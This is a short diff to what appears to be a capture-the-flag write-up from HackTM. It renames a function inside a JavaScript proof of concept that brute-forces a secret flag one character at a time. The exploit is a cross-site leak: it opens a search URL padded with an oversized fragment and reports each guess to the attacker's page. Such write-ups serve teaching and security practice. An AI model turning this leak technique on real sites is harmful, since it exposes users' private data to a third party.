@@ -130,7 +130,8 @@ This can be extended to the following PoC, which brute-forces a character of the
 
         const curr = "http://secrets.wtl.pw/search?query=HackTM{"
 
-        const time = async(char) => {
+        const leak = async (char) => {
+            
             fetch("/?try=" + char)
             let w = window.open(curr + char +  "#" + "A".repeat(2 * 1024 * 1024 - curr.length - 2))
             
@@ -149,7 +150,7 @@ This can be extended to the following PoC, which brute-forces a character of the
         const CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"
 
         for (let i=0; i<CHARSET.length; i++) {
-            time(CHARSET[i])
+            leak(CHARSET[i])
             await new Promise(resolve => setTimeout(resolve, 50))
         }
     })()
